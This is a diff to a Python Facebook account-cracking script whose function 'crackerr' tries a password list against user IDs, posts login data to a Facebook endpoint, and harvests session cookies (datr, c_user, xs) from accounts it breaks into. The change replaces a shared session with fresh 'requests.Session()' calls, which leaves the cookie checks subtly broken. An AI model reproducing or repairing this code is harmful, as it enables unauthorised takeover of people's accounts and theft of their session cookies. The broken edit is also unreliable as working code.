@@ -503,7 +503,7 @@ def crackerr(ids,passlist):
             "upgrade-insecure-requests": "1",
             "user-agent": us,
             "viewport-width": "980"}
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = requests.Session().get('https://m.facebook.com').text
             log_data = {
             "__aaid": "0",
             "__user": "0",
@@ -551,10 +551,10 @@ def crackerr(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"} 
             url = "https://p.facebook.com/async/wbloks/fetch/"
-            response = session.post(url,params=params,data=log_data,headers=headers,allow_redirects=False).text
-            log_cookies = session.cookies.get_dict().keys()
+            response = requests.Session().post(url,params=params,data=log_data,headers=headers,allow_redirects=False).text
+            log_cookies = requests.Session().cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                kuki=";".join([f"{key}={requests.Session().cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 cid = re.findall('c_user=(.*);xs', kuki)[0]
                 check = check_lock(cid)
                 if "live" in check:
